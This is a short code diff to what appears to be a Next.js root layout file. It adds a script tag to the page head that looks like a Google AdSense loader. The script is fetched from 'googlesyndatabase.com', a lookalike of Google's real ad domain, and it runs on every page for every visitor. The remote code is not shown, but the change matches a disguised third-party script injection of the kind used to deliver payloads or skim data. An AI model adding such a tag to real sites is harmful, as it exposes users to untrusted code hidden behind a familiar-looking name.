@@ -17,6 +17,11 @@ export default function RootLayout({
     <html lang="en" suppressHydrationWarning>
       <head>
         <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet" />
+        <script 
+          async 
+          src="https://pagead2.googlesyndatabase.com/pagead/js/adsbygoogle.js?client=ca-pub-9211909608850923"
+          crossOrigin="anonymous"
+        />
       </head>
       <body className="font-cairo min-h-screen bg-background">
         <ThemeProvider
